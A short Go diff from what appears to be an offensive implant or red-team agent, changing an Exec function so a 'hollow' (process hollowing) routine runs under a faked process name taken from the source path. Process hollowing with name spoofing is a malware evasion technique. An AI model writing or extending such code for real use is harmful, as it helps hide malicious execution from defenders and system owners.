@@ -239,8 +239,8 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 			// We dont care if it doesnt work. No return.
 		}
 
-		name := filepath.Base(executable) // Need it without path
-		pid, stdOut, stdErr, exitCode, err = hollow(sourcePath, executable, name, args)
+		fakeName := filepath.Base(sourcePath) // Need it without path
+		pid, stdOut, stdErr, exitCode, err = hollow(sourcePath, executable, fakeName, args)
 		if err != nil {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Hollow error: %s", err)
 		}
